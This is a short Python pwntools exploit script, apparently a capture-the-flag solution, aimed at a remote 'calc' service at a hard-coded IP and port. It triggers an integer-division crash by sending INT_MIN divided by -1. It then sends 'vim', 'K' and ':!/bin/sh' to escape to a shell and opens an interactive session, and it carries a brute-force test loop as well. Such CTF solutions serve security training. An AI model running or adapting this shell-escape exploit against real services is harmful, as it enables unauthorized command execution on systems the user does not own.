from pwn import *
import time
debug = False
if debug:
	io = process("./calc")
else:
	io = remote("202.38.95.46",12008)

def calcu(option):
	io.recvuntil(">>> ")
	io.sendline(option)

def test():
	for i in xrange(2**64):
		io = process("./calc")
		payload = "1/{par}".format(par=i)
		io.sendline(payload)
		print io.recv()
		io.close()

#test()
context.log_level = "debug"
#test1 = int("1"+"1"*31,2)
int1 = -(1<<31)
int2 = -1
calcu("{c1}/{c2}".format(c1=int1,c2=int2))
#print io.recvall(timeout=1)
io.recvline()
#io.sendline("/bin/s\\h")

io.sendline("vim")
time.sleep(1)
io.sendline("K")
time.sleep(1)
io.sendline(":!/bin/sh")
time.sleep(1)

#print io.recv()
io.interactive()
